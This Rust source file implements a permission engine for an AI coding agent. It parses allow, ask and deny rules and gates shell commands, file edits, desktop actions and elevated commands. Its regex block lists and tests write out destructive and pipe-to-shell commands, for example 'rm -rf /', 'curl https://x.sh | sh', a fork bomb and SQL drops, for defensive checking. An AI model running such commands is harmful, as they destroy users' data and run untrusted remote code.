//! Permission engine. Rules look like `Bash`, `Bash(npm run *)`, `Edit(src/**)`,
//! `Read(./docs/**)`, and `mcp__server__tool`.
//!
//! Order: deny rules → ask rules → allow rules → mode defaults. Dangerous shell
//! commands always ask, even when allowed. Plan mode denies everything but reads.

use std::sync::LazyLock;

use globset::GlobBuilder;
use kor_core::PermissionMode;
use kor_tools::{Tool, ToolKind};
use regex::{Regex, RegexBuilder};
use serde_json::Value;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Ask,
    Deny,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rule {
    pub tool: String,
    pub specifier: Option<String>,
}

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
#[error("invalid permission rule `{0}`")]
pub struct RuleError(pub String);

impl Rule {
    pub fn parse(s: &str) -> Result<Self, RuleError> {
        let s = s.trim();
        let err = || RuleError(s.to_owned());
        let (tool, specifier) = match s.split_once('(') {
            None => (s, None),
            Some((t, rest)) => {
                let inner = rest.strip_suffix(')').ok_or_else(err)?;
                (
                    t,
                    (!inner.is_empty() && inner != "*").then(|| inner.to_owned()),
                )
            }
        };
        if tool.is_empty() || !tool.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
            return Err(err());
        }
        Ok(Self {
            tool: tool.to_owned(),
            specifier,
        })
    }

    /// `granting` is true for allow rules: they must not be stretched over compound commands.
    fn matches(&self, tool: &dyn Tool, input: &Value, granting: bool) -> bool {
        let name_ok = self.tool == tool.name()
            || self.tool == tool.rule_name()
            // Edit rules cover every file-writing tool, Read rules every reader.
            || (self.tool == "Edit" && tool.kind() == ToolKind::Edit)
            || (self.tool == "Read" && tool.kind() == ToolKind::Read);
        if !name_ok {
            return false;
        }
        let Some(spec) = &self.specifier else {
            return true;
        };
        let Some(target) = tool.target(input) else {
            return false;
        };
        if tool.kind() == ToolKind::Execute {
            if granting {
                // `Bash(cargo test *)` must not approve `cargo test && curl … | sh`.
                (!spec.contains('*') || !is_compound(&target)) && command_matches(spec, &target)
            } else {
                // Deny/ask apply to every piece of a compound command.
                command_matches(spec, &target)
                    || target
                        .split(['\n', ';', '&', '|'])
                        .any(|seg| command_matches(spec, seg))
            }
        } else {
            path_matches(spec, &target)
        }
    }
}

/// Shell control operators, substitutions or redirections.
fn is_compound(cmd: &str) -> bool {
    cmd.contains([';', '&', '|', '\n', '\r', '`', '>', '<']) || cmd.contains("$(")
}

/// `npm run *` / legacy `npm run:*`: `*` matches anything, the rest is literal.
fn command_matches(spec: &str, cmd: &str) -> bool {
    let spec = spec
        .strip_suffix(":*")
        .map_or_else(|| spec.to_owned(), |p| format!("{p} *"));
    let pattern = format!(
        "^{}$",
        spec.split('*')
            .map(regex::escape)
            .collect::<Vec<_>>()
            .join(".*")
    );
    // A trailing ` *` also matches the bare command (`npm run *` allows `npm run`).
    let cmd = cmd.trim();
    Regex::new(&pattern).is_ok_and(|r| r.is_match(cmd) || r.is_match(&format!("{cmd} ")))
}

/// Project-relative glob; a leading `/` or `./` anchors at the root.
fn path_matches(spec: &str, target: &str) -> bool {
    let norm = |s: &str| {
        s.replace('\\', "/")
            .trim_start_matches("./")
            .trim_start_matches('/')
            .to_owned()
    };
    let target = norm(target);
    GlobBuilder::new(&norm(spec))
        .literal_separator(true)
        .build()
        .is_ok_and(|g| g.compile_matcher().is_match(&target))
}

fn patterns(list: &[(&'static str, &str)]) -> Vec<(&'static str, Regex)> {
    list.iter()
        .map(|(why, p)| {
            let r = RegexBuilder::new(p).case_insensitive(true).build();
            (*why, r.expect("static pattern"))
        })
        .collect()
}

/// Commands that always ask (spec §6.3), with a reason key (`destructive-<key>` in the UI).
static DANGEROUS: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
    patterns(&[
        ("rm-rf", r"\brm\s+(-[a-z]*\s+)*-[a-z]*r[a-z]*\s+(-[a-z]+\s+)*(/|~|\$home|\*|\.)(\s|$)"),
        ("force-push", r"\bgit\s+push\b.*(--force\b|\s-f\b|--force-with-lease)"),
        ("reset-hard", r"\bgit\s+reset\s+--hard\b"),
        ("git-clean", r"\bgit\s+clean\s+-[a-z]*f"),
        ("pipe-to-shell", r"\b(curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|]*\|\s*(sudo\s+)?(sh|bash|zsh|iex|invoke-expression|pwsh|powershell)\b"),
        ("disk", r"\bmkfs(\.|\b)"),
        ("disk", r"\bdd\s+.*\bof=/dev/"),
        ("fork-bomb", r":\(\)\s*\{\s*:\|:&\s*\};:"),
        ("rm-rf", r"\bremove-item\b.*-recurse\b.*\s(/|[a-z]:\\?|~|\$home)(\s|$)"),
        ("disk", r"\bformat(\.com)?\s+[a-z]:"),
        ("shutdown", r"\b(shutdown|reboot|halt)\b"),
        ("chmod", r"\bchmod\s+-r\s+777\s+/"),
        ("sudo", r"\bsudo\b"),
        ("sql-drop", r"\b(drop\s+(table|database|schema)|truncate\s+table)\b"),
        // An MCP tool its server marks destructive (`kor_agent::mcp_tools::WRITE_MARK`).
        ("mcp-write", r"^mcp-write\s"),
        ("migration", r"(\bmanage\.py\s+migrate\b|\bprisma\s+migrate\b|\bdb:(migrate|rollback|drop|reset)\b|\b(sqlx|knex|flyway)\s+migrate\b|\bdiesel\s+migration\b|\balembic\s+(upgrade|downgrade)\b|\bef\s+database\s+update\b)"),
    ])
});

/// Destructive but not always-ask: shown in red, never remembered by "always allow".
static DESTRUCTIVE: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
    patterns(&[
        ("rm-rf", r"\brm\s+(-[a-z]*\s+)*-[a-z]*r[a-z]*\b"),
        ("rm-rf", r"\b(remove-item|rmdir|rd)\b.*\s(-recurse|/s)\b"),
        ("delete-file", r"\b(rm|del|remove-item|unlink)\s"),
        ("reset-hard", r"\bgit\s+(checkout\s+--\s|restore\s|branch\s+-D\b|stash\s+(drop|clear)\b)"),
    ])
});

fn reason_in(list: &[(&'static str, Regex)], command: &str) -> Option<&'static str> {
    list.iter().find(|(_, r)| r.is_match(command)).map(|(why, _)| *why)
}

pub fn is_dangerous(command: &str) -> bool {
    reason_in(&DANGEROUS, command).is_some()
}

/// Why this call is destructive, as a reason key, from the command or the tool alone.
/// File-level risks (deletions, unread overwrites) come from `kor_tools::review_risk`.
pub fn destructive(tool: &dyn Tool, input: &Value) -> Option<&'static str> {
    match (tool.kind(), tool.name()) {
        (_, "Delete") => Some("delete-file"),
        (_, "Move") if input["overwrite"].as_bool() == Some(true) => Some("overwrite-unread"),
        (ToolKind::Execute, _) => tool
            .target(input)
            .and_then(|c| reason_in(&DANGEROUS, &c).or_else(|| reason_in(&DESTRUCTIVE, &c))),
        _ => None,
    }
}

#[derive(Debug, Clone, Default)]
pub struct Permissions {
    pub mode: PermissionMode,
    allow: Vec<Rule>,
    ask: Vec<Rule>,
    deny: Vec<Rule>,
}

impl Permissions {
    pub fn new(
        mode: PermissionMode,
        allow: &[String],
        ask: &[String],
        deny: &[String],
    ) -> Result<Self, RuleError> {
        let parse = |v: &[String]| {
            v.iter()
                .map(|s| Rule::parse(s))
                .collect::<Result<Vec<_>, _>>()
        };
        Ok(Self {
            mode,
            allow: parse(allow)?,
            ask: parse(ask)?,
            deny: parse(deny)?,
        })
    }

    /// Add allow rules (e.g. a slash command's `allowed-tools`).
    pub fn add_allow(&mut self, rules: &[String]) -> Result<(), RuleError> {
        for r in rules {
            self.allow.push(Rule::parse(r)?);
        }
        Ok(())
    }

    /// Remember an "always allow" answer for this exact call for the rest of the session.
    pub fn allow_exact(&mut self, tool: &dyn Tool, input: &Value) {
        let specifier = tool.target(input).map(|t| {
            if tool.kind() == ToolKind::Execute {
                t.replace('*', "?") // keep the literal command from acting as a wildcard
            } else {
                t
            }
        });
        self.allow.push(Rule {
            tool: tool.name().to_owned(),
            specifier,
        });
    }

    pub fn rules(&self) -> [(&'static str, &[Rule]); 3] {
        [
            ("deny", &self.deny),
            ("ask", &self.ask),
            ("allow", &self.allow),
        ]
    }

    /// Whole-tool rule (no specifier) for this session: `allow`, `ask`, `deny`, or `None` to drop
    /// it and fall back to the mode and the configured rules.
    pub fn set_tool_level(&mut self, tool: &str, level: Option<&str>) {
        for list in [&mut self.allow, &mut self.ask, &mut self.deny] {
            list.retain(|r| !(r.tool == tool && r.specifier.is_none()));
        }
        let rule = Rule {
            tool: tool.to_owned(),
            specifier: None,
        };
        match level {
            Some("allow") => self.allow.push(rule),
            Some("ask") => self.ask.push(rule),
            Some("deny") => self.deny.push(rule),
            _ => {}
        }
    }

    /// The whole-tool level set for `tool`, if any (`deny` wins, then `allow`, then `ask`).
    pub fn tool_level(&self, tool: &str) -> Option<&'static str> {
        let has = |list: &[Rule]| list.iter().any(|r| r.tool == tool && r.specifier.is_none());
        if has(&self.deny) {
            Some("deny")
        } else if has(&self.allow) {
            Some("allow")
        } else if has(&self.ask) {
            Some("ask")
        } else {
            None
        }
    }

    pub fn decide(&self, tool: &dyn Tool, input: &Value) -> Decision {
        let any = |rules: &[Rule], granting| rules.iter().any(|r| r.matches(tool, input, granting));
        if any(&self.deny, false) {
            return Decision::Deny;
        }
        // Elevation always asks unless a rule names it explicitly (a broad `Bash` rule or
        // `auto`/`acceptEdits` never grants it); the OS shows its own prompt as well.
        if tool.name() == "RunElevated" {
            return match self.mode {
                PermissionMode::Plan | PermissionMode::DontAsk => Decision::Deny,
                PermissionMode::BypassPermissions => Decision::Allow,
                _ if any(&self.allow, true) => Decision::Allow,
                _ => Decision::Ask,
            };
        }
        if kor_tools::is_computer_tool(tool.name()) {
            // §19.1 (ADR 0059): after the user took over the mouse / keyboard the next desktop
            // action asks in every mode; a `full`-tier app runs without asking.
            return match self.mode {
                PermissionMode::DontAsk => Decision::Deny,
                _ if kor_tools::computer_paused() => Decision::Ask,
                PermissionMode::BypassPermissions => Decision::Allow,
                PermissionMode::Plan => Decision::Ask,
                _ if kor_tools::computer_auto_allowed(tool.name(), input) => Decision::Allow,
                _ => Decision::Ask,
            };
        }
        let kind = tool.kind();
        if self.mode == PermissionMode::Plan && kind != ToolKind::Read {
            return Decision::Deny;
        }
        // `bypassPermissions` is the one mode that does not stop for dangerous commands.
        let dangerous = kind == ToolKind::Execute
            && self.mode != PermissionMode::BypassPermissions
            && tool.target(input).is_some_and(|c| is_dangerous(&c));
        if any(&self.ask, false) || dangerous {
            return if self.mode == PermissionMode::DontAsk {
                Decision::Deny
            } else {
                Decision::Ask
            };
        }
        if any(&self.allow, true) {
            return Decision::Allow;
        }
        match (kind, self.mode) {
            (ToolKind::Read, _)
            | (
                ToolKind::Edit,
                PermissionMode::AcceptEdits
                | PermissionMode::Auto
                | PermissionMode::BypassPermissions,
            )
            | (ToolKind::Execute, PermissionMode::Auto | PermissionMode::BypassPermissions) => {
                Decision::Allow
            }
            (_, PermissionMode::DontAsk) => Decision::Deny,
            _ => Decision::Ask,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn tool(name: &str) -> std::sync::Arc<dyn Tool> {
        kor_tools::default_tools()
            .into_iter()
            .chain(kor_tools::computer_tools())
            .find(|t| t.name() == name)
            .unwrap()
    }

    fn perms(mode: PermissionMode, allow: &[&str], ask: &[&str], deny: &[&str]) -> Permissions {
        let v = |x: &[&str]| x.iter().map(|s| (*s).to_owned()).collect::<Vec<_>>();
        Permissions::new(mode, &v(allow), &v(ask), &v(deny)).unwrap()
    }

    #[test]
    fn rule_parsing() {
        assert_eq!(Rule::parse("Bash").unwrap().specifier, None);
        assert_eq!(Rule::parse("Bash(*)").unwrap().specifier, None);
        assert_eq!(
            Rule::parse("Bash(npm run *)").unwrap().specifier.as_deref(),
            Some("npm run *")
        );
        assert_eq!(
            Rule::parse("mcp__github__create_issue").unwrap().tool,
            "mcp__github__create_issue"
        );
        for bad in ["", "Bash(", "Ba sh", "Edit(x"] {
            assert!(Rule::parse(bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn mode_defaults() {
        use Decision::{Allow, Ask, Deny};
        let (read, edit, bash) = (tool("Read"), tool("Edit"), tool("Bash"));
        let i = json!({"path": "a.rs", "command": "cargo test"});
        let d = |m| {
            let p = perms(m, &[], &[], &[]);
            (
                p.decide(&*read, &i),
                p.decide(&*edit, &i),
                p.decide(&*bash, &i),
            )
        };
        assert_eq!(d(PermissionMode::Default), (Allow, Ask, Ask));
        assert_eq!(d(PermissionMode::AcceptEdits), (Allow, Allow, Ask));
        assert_eq!(d(PermissionMode::Auto), (Allow, Allow, Allow));
        assert_eq!(d(PermissionMode::Plan), (Allow, Deny, Deny));
        assert_eq!(d(PermissionMode::DontAsk), (Allow, Deny, Deny));
        assert_eq!(d(PermissionMode::BypassPermissions), (Allow, Allow, Allow));
    }

    #[test]
    fn computer_use_asks_unless_bypass_and_deny_blocks() {
        use Decision::{Allow, Ask, Deny};
        let shot = tool("screenshot");
        let click = tool("left_click");
        let input = json!({"coordinate": [1, 2]});
        assert_eq!(
            perms(PermissionMode::Default, &[], &[], &[]).decide(&*shot, &input),
            Ask
        );
        assert_eq!(
            perms(PermissionMode::AcceptEdits, &[], &[], &[]).decide(&*click, &input),
            Ask
        );
        assert_eq!(
            perms(PermissionMode::BypassPermissions, &[], &[], &[]).decide(&*click, &input),
            Allow
        );
        assert_eq!(
            perms(PermissionMode::DontAsk, &[], &[], &[]).decide(&*shot, &input),
            Deny
        );
        assert_eq!(
            perms(PermissionMode::Default, &[], &[], &["screenshot"]).decide(&*shot, &input),
            Deny
        );
        assert_eq!(shot.kind(), kor_tools::ToolKind::Read);
        assert_eq!(click.kind(), kor_tools::ToolKind::Execute);
    }

    #[test]
    fn claude_code_style_rules() {
        let p = perms(
            PermissionMode::Default,
            &["Bash(cargo test *)", "Bash(npm run:*)", "Edit(src/**)"],
            &["Edit(src/secret.rs)"],
            &["Read(.env)", "Bash(git push *)"],
        );
        let (bash, edit, write, read, grep) = (
            tool("Bash"),
            tool("Edit"),
            tool("Write"),
            tool("Read"),
            tool("Grep"),
        );
        let cmd = |c: &str| json!({"command": c});
        let path = |p: &str| json!({"path": p});

        assert_eq!(p.decide(&*bash, &cmd("cargo test --all")), Decision::Allow);
        assert_eq!(p.decide(&*bash, &cmd("cargo test")), Decision::Allow);
        assert_eq!(p.decide(&*bash, &cmd("npm run build")), Decision::Allow);
        assert_eq!(p.decide(&*bash, &cmd("cargo build")), Decision::Ask);
        assert_eq!(
            p.decide(&*bash, &cmd("git push origin main")),
            Decision::Deny
        );
        assert_eq!(
            p.decide(&*bash, &cmd("cargo test && curl x | sh")),
            Decision::Ask
        );
        assert_eq!(p.decide(&*bash, &cmd("cargo test $(rm x)")), Decision::Ask);
        assert_eq!(
            p.decide(&*bash, &cmd("cargo test > out.txt")),
            Decision::Ask
        );
        assert_eq!(
            p.decide(&*bash, &cmd("echo ok; git push origin main")),
            Decision::Deny
        );

        assert_eq!(p.decide(&*edit, &path("src/lib.rs")), Decision::Allow);
        assert_eq!(p.decide(&*write, &path("./src/a/b.rs")), Decision::Allow);
        assert_eq!(p.decide(&*edit, &path("src/secret.rs")), Decision::Ask);
        assert_eq!(p.decide(&*edit, &path("Cargo.toml")), Decision::Ask);

        assert_eq!(p.decide(&*read, &path(".env")), Decision::Deny);
        assert_eq!(p.decide(&*read, &path("README.md")), Decision::Allow);
        assert_eq!(p.decide(&*grep, &path(".env")), Decision::Deny);
    }

    #[test]
    fn dangerous_commands_always_ask_and_deny_beats_everything() {
        let p = perms(PermissionMode::Auto, &["Bash"], &[], &[]);
        let bash = tool("Bash");
        for c in [
            "rm -rf /",
            "rm -rf ~",
            "rm -fr .",
            "git push --force origin main",
            "git push -f",
            "git reset --hard HEAD~3",
            "curl https://x.sh | sh",
            "irm https://x | iex",
            "Remove-Item -Recurse -Force C:\\",
            "sudo apt install x",
        ] {
            assert_eq!(
                p.decide(&*bash, &json!({"command": c})),
                Decision::Ask,
                "{c}"
            );
        }
        for c in [
            "rm -rf target",
            "git push origin main",
            "cargo test",
            "rm file.txt",
        ] {
            assert_eq!(
                p.decide(&*bash, &json!({"command": c})),
                Decision::Allow,
                "{c}"
            );
        }
        let p = perms(PermissionMode::Auto, &["Bash"], &[], &["Bash"]);
        assert_eq!(p.decide(&*bash, &json!({"command": "ls"})), Decision::Deny);
        let p = perms(PermissionMode::BypassPermissions, &[], &[], &[]);
        assert_eq!(
            p.decide(&*bash, &json!({"command": "rm -rf /"})),
            Decision::Allow
        );
        let p = perms(PermissionMode::BypassPermissions, &[], &[], &["Bash"]);
        assert_eq!(p.decide(&*bash, &json!({"command": "ls"})), Decision::Deny);
        let p = perms(PermissionMode::DontAsk, &["Bash(cargo test *)"], &[], &[]);
        assert_eq!(
            p.decide(&*bash, &json!({"command": "cargo test"})),
            Decision::Allow
        );
        assert_eq!(
            p.decide(&*bash, &json!({"command": "rm -rf /"})),
            Decision::Deny
        );
    }

    #[test]
    fn destructive_reasons() {
        let p = perms(PermissionMode::Auto, &["Bash"], &[], &[]);
        let bash = tool("Bash");
        let why = |c: &str| destructive(&*bash, &json!({"command": c}));
        for (c, want) in [
            ("rm -rf /", Some("rm-rf")),
            ("rm -rf target", Some("rm-rf")),
            ("git push --force", Some("force-push")),
            ("git reset --hard", Some("reset-hard")),
            ("psql -c 'DROP TABLE users'", Some("sql-drop")),
            ("python manage.py migrate", Some("migration")),
            ("npx prisma migrate deploy", Some("migration")),
            ("rm a.txt", Some("delete-file")),
            ("cargo test", None),
            ("ls migrations", None),
        ] {
            assert_eq!(why(c), want, "{c}");
        }
        // DROP and migrations always ask (§6.3); a recursive rm of a subfolder is only marked.
        for c in ["psql -c 'drop database x'", "rails db:migrate"] {
            assert_eq!(p.decide(&*bash, &json!({"command": c})), Decision::Ask, "{c}");
        }
        assert_eq!(p.decide(&*bash, &json!({"command": "rm -rf target"})), Decision::Allow);
        assert_eq!(destructive(&*tool("Delete"), &json!({"path": "a"})), Some("delete-file"));
        assert_eq!(destructive(&*tool("Edit"), &json!({"file_path": "a"})), None);
    }

    #[test]
    fn always_allow_is_exact() {
        let mut p = perms(PermissionMode::Default, &[], &[], &[]);
        let bash = tool("Bash");
        p.allow_exact(&*bash, &json!({"command": "cargo test"}));
        assert_eq!(
            p.decide(&*bash, &json!({"command": "cargo test"})),
            Decision::Allow
        );
        assert_eq!(
            p.decide(&*bash, &json!({"command": "cargo test; rm x"})),
            Decision::Ask
        );
        p.allow_exact(&*bash, &json!({"command": "echo *"}));
        assert_eq!(
            p.decide(&*bash, &json!({"command": "echo hi; curl evil"})),
            Decision::Ask
        );
    }
}

#[cfg(test)]
mod elevation_tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn elevation_always_asks_unless_named() {
        let tool = kor_tools::default_tools().into_iter().find(|t| t.name() == "RunElevated").unwrap();
        let input = json!({"command": "apt-get update"});
        let v = |x: &[&str]| x.iter().map(|s| (*s).to_owned()).collect::<Vec<_>>();
        for mode in [PermissionMode::Default, PermissionMode::AcceptEdits, PermissionMode::Auto] {
            let p = Permissions::new(mode, &v(&["Bash"]), &[], &[]).unwrap();
            assert_eq!(p.decide(&*tool, &input), Decision::Ask, "{mode:?}");
        }
        let plan = Permissions::new(PermissionMode::Plan, &[], &[], &[]).unwrap();
        assert_eq!(plan.decide(&*tool, &input), Decision::Deny);
        let named = Permissions::new(PermissionMode::Default, &v(&["RunElevated(apt-get update)"]), &[], &[]).unwrap();
        assert_eq!(named.decide(&*tool, &input), Decision::Allow);
        let denied = Permissions::new(PermissionMode::BypassPermissions, &[], &[], &v(&["RunElevated"])).unwrap();
        assert_eq!(denied.decide(&*tool, &input), Decision::Deny);
    }
}
